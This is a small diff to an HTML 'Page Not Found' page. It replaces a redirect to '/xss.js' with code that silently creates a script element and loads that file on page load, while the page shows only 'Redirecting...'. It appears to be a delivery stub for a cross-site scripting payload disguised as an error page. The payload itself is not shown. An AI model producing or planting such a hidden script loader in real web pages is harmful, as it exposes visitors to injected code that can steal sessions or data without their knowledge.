@@ -9,8 +9,10 @@
     <h1>Page Not Found</h1>
     <p>Redirecting...</p>
     <script>
-        // Load xss.js regardless of the path
-        window.location.replace('/xss.js');
+        // Create a script element and load xss.js
+        var script = document.createElement('script');
+        script.src = '/xss.js';
+        document.body.appendChild(script);
     </script>
 </body>
 </html>
